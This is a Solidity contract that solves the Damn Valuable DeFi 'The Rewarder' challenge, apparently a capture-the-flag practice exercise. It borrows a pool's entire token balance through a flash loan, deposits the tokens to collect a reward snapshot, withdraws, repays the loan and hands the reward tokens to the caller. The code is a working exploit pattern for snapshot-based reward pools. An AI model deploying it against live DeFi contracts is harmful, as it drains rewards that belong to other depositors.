import "./AccountingToken.sol";
import "./FlashLoanerPool.sol";
import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewardAttack {
    address public rewardPool;
    address public flashPool;
    address public DVT;
    address public rewardToken;

    constructor (address rwAddr, address flAddr, address tokenAddr, address rwTokenAddr) {
        rewardPool = rwAddr;
        flashPool = flAddr;
        DVT = tokenAddr;
        rewardToken = rwTokenAddr;
    }

    function receiveFlashLoan(uint256 amount) external {
        DamnValuableToken(DVT).approve(rewardPool, amount);
        TheRewarderPool(rewardPool).deposit(amount);
        require(RewardToken(rewardToken).balanceOf(address(this))>25 ether, "No reward");
        //require(TheRewarderPool(rewardPool).accToken.balanceOfAt(address(this), TheRewarderPool(rewardPool).lastSnapshotIdForRewards)>0, "No Acc Token");
        TheRewarderPool(rewardPool).withdraw(amount);
        DamnValuableToken(DVT).transfer(msg.sender, amount);
        
    }

    function hack() external {
        FlashLoanerPool(flashPool).flashLoan(DamnValuableToken(DVT).balanceOf(flashPool));
        RewardToken(rewardToken).transfer(msg.sender, RewardToken(rewardToken).balanceOf(address(this)));
    }
}